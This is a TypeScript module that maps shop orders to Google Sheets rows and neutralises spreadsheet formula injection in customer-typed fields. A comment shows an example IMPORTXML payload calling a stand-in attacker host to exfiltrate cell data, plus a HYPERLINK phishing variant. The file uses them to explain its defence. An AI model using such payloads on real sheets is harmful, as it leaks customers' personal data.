import {
  PAYMENT_METHOD_LABELS,
  PAYMENT_STATUS_LABELS,
  STATUS_LABELS,
  type Order,
} from '@/lib/orders/schema'

/**
 * One order, as spreadsheet rows.
 *
 * ── ONE ROW PER ORDER ITEM, NOT PER ORDER ────────────────────────────────
 *
 * The whole point of the sheet is reporting, and the questions NEYORA wants
 * answered are per-variety: how much white oyster sold today, how much grey.
 * With one row per order, a two-item order has to cram its items into a single
 * cell, and no formula can ever pull those numbers back out.
 *
 * One row per item makes every one of those a SUMIF. NEYORA sells one item per
 * order today, so right now every row IS an order — the model costs nothing
 * now and needs no migration when a basket arrives.
 *
 * ── COUNTING MONEY WITHOUT DOUBLE COUNTING ───────────────────────────────
 *
 * `Line Total` is per row and always safe to sum: it is revenue.
 * `Order Total` is REPEATED on every line of the same order — useful when
 * reading one row, wrong to sum across rows. The header note on the sheet says
 * so, and this comment is the second place it is written down.
 *
 *   Revenue      =SUM(Line Total)
 *   Order count  =COUNTUNIQUE(Order Reference)
 *
 * ── IDEMPOTENCY ──────────────────────────────────────────────────────────
 *
 * `Row Key` is `NEY-0021#1`, unique per line and stable for the life of the
 * order. It is what turns "sync this order" into an upsert rather than an
 * append, so a retry can never leave two rows for the same line. It is column A
 * because the sync reads that column to find existing rows.
 *
 * Deliberately pure: no network, no environment, no `server-only`. That is what
 * makes the mapping testable without a spreadsheet.
 */

export const SHEET_HEADERS = [
  'Row Key',
  'Order Reference',
  'Created At (IST)',
  'Customer Name',
  'Phone',
  'Address Line 1',
  'Address Line 2',
  'Area',
  'City',
  'Pincode',
  'Landmark',
  'Product',
  'Variety',
  'Pack Size',
  'Quantity',
  'Unit Price (₹)',
  'Line Total (₹)',
  'Order Total (₹)',
  'Payment Method',
  'Payment Status',
  'Paid At (IST)',
  'Order Status',
  'Email Alert',
  'Last Updated (IST)',
] as const

export type SheetRow = (string | number)[]

/**
 * Column indexes the formatter needs, derived from the headers rather than
 * written out — so inserting a column cannot silently apply a currency format
 * to the wrong one.
 */
export const COLUMN = Object.fromEntries(
  SHEET_HEADERS.map((header, index) => [header, index]),
) as Record<(typeof SHEET_HEADERS)[number], number>

/** The stable external key for one line of one order. */
export function rowKey(reference: string, lineIndex: number): string {
  return `${reference}#${lineIndex + 1}`
}

/**
 * The characters that make Google Sheets treat a cell as a formula.
 *
 * `=` and `+` are the obvious ones; `-` because `-1+1` evaluates; `@` because
 * Sheets accepts it as a legacy function prefix; tab and carriage return
 * because they can be used to shift a value into formula position.
 */
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/

/**
 * Neutralise spreadsheet formula injection.
 *
 * ── WHY THIS EXISTS ──────────────────────────────────────────────────────
 *
 * Every free-text field here is typed by a CUSTOMER at checkout — their name,
 * their street, their landmark. Written with `USER_ENTERED`, a name of
 *
 *     =IMPORTXML("https://evil.example/?d="&A2, "//a")
 *
 * is not text. It is a live formula that runs the moment an admin opens the
 * sheet, and `IMPORTXML` makes an outbound request — so the attacker receives
 * the contents of whatever cells they reference. Every row in the sheet holds
 * another customer's name, phone number and home address.
 *
 * `=HYPERLINK(...)` is the phishing variant: a link the admin has every reason
 * to trust, because it is inside their own operations sheet.
 *
 * ── THE FIX ──────────────────────────────────────────────────────────────
 *
 * A leading apostrophe tells Sheets "this is text". It is not displayed and is
 * not part of the stored value, so the cell still reads exactly as the customer
 * typed it — it simply does not execute.
 *
 * Applied only when needed, so ordinary values are not littered with
 * apostrophes, and idempotent so a value already forced to text is not
 * double-prefixed.
 */
export function safeText(value: string | undefined | null): string {
  const text = value ?? ''
  if (text === '' || text.startsWith("'")) return text
  return FORMULA_TRIGGERS.test(text) ? `'${text}` : text
}

/** Always text, whatever it looks like. For values Sheets would retype. */
function forceText(value: string): string {
  return value.startsWith("'") ? value : `'${value}`
}

/**
 * IST, as `2026-10-05 14:21`, forced to text.
 *
 * Three decisions here, each one a bug avoided:
 *
 * 1. IST, not UTC. An order time in the wrong zone is worse than none — it
 *    reads as plausible and is five and a half hours out.
 *
 * 2. Year-first, not `dd/mm/yyyy`. Text in this format sorts chronologically,
 *    which day-first does not, and it cannot be misread as month-first by an
 *    American reader or by Sheets itself.
 *
 * 3. The leading apostrophe forces TEXT. Without it, `USER_ENTERED` parses the
 *    string as a datetime and stores a locale-dependent serial number — so the
 *    value read back is not the value written, every comparison during a
 *    reconcile reports a spurious change, and the displayed time shifts with
 *    whoever opens the sheet.
 *
 * Still usable for date reporting: `=DATEVALUE(LEFT(C2,10))` gives a real date,
 * and QUERY/FILTER match the prefix directly.
 */
function ist(date: Date | string | undefined): string {
  if (!date) return ''
  const value = new Date(date)
  if (Number.isNaN(value.getTime())) return ''

  const parts = new Intl.DateTimeFormat('en-CA', {
    timeZone: 'Asia/Kolkata',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    hour12: false,
  }).formatToParts(value)

  const get = (type: string) => parts.find((part) => part.type === type)?.value ?? ''
  return `'${get('year')}-${get('month')}-${get('day')} ${get('hour')}:${get('minute')}`
}

/**
 * A cell as it comes back from Sheets, for comparison.
 *
 * We write `'9876543210` to force text; Sheets stores `9876543210` and returns
 * that. Comparing the written form against the read form would report every
 * row as changed on every reconcile, and rewrite the entire sheet each time.
 */
export function normaliseCell(value: unknown): string {
  if (value === null || value === undefined) return ''
  return String(value).replace(/^'/, '').trim()
}

/** Do these two rows say the same thing? Drives added/updated/unchanged. */
export function rowsMatch(a: readonly unknown[], b: readonly unknown[]): boolean {
  const length = Math.max(a.length, b.length)
  for (let i = 0; i < length; i += 1) {
    if (normaliseCell(a[i]) !== normaliseCell(b[i])) return false
  }
  return true
}

export function orderToRows(order: Order): SheetRow[] {
  const address = order.customer.address
  const emailAlert = order.notifications?.email?.status ?? 'pending'

  /*
   * EVERY string cell goes through `safeText`. Not just the obviously
   * customer-typed ones: a product name can be edited from the admin, a
   * variety label comes from a content file, and a status label could change.
   * Deciding field by field which inputs are "trusted" is how one gets missed.
   */
  return order.items.map((item, index) => [
    rowKey(order.reference, index),
    order.reference,
    ist(order.createdAt),
    safeText(order.customer.name),
    // Forced to text: without it Sheets reads a 10-digit number as a number,
    // drops any leading zero and renders it in scientific notation.
    forceText(order.customer.phone),
    safeText(address.line1),
    safeText(address.line2),
    safeText(address.area),
    safeText(address.city),
    forceText(address.pincode),
    safeText(address.landmark),
    safeText(item.name),
    safeText(item.variety),
    safeText(item.packLabel),
    // Numbers stay numbers, so the money columns can be summed.
    item.quantity,
    item.unitPrice,
    item.unitPrice * item.quantity,
    // Repeated per line. Safe to read, wrong to sum — see the note above.
    order.total,
    safeText(PAYMENT_METHOD_LABELS[order.payment.method] ?? order.payment.method),
    safeText(PAYMENT_STATUS_LABELS[order.payment.status] ?? order.payment.status),
    ist(order.payment.paidAt),
    safeText(STATUS_LABELS[order.status] ?? order.status),
    safeText(emailAlert),
    ist(order.updatedAt),
  ])
}
